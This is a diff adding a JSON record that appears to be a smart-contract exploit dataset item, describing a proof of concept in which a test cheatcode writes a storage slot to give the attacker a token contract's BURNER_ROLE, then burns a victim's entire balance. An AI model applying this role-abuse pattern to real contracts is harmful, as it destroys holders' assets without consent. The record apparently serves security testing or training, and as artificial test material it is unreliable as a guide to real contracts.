@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The vulnerability lies in an owner privilege abuse flaw within the target contract. An account holding the 'BURNER_ROLE' has the unrestricted ability to burn tokens from any other account. The PoC demonstrates this by first granting the attacker this role via storage manipulation and then using it to eliminate a victim's entire token balance.",
+  "interface_arsenal": "interface ISecondToken {\n    function burn(address account, uint256 amount) external;\n    function balanceOf(address account) external view returns (uint256);\n    function hasRole(bytes32 role, address account) external view returns (bool);\n}",
+  "attack_sequence": "bytes32 burnerRole = keccak256(\"BURNER_ROLE\");\nbytes32 rootSlot = keccak256(abi.encode(burnerRole, uint256(5)));\nbytes32 memberSlot = keccak256(abi.encode(attacker, rootSlot));\nvm.store(TARGET, memberSlot, bytes32(uint256(1)));\n\nISecondToken(TARGET).burn(victim, victimInitialBalance);",
+  "winning_reflection": "The key insight was recognizing the excessive power of the 'BURNER_ROLE'. The strategy focused on obtaining this role—in this test case, through direct storage slot manipulation—which then granted the ability to call the `burn` function on behalf of any user, effectively destroying their assets without their consent."
+}
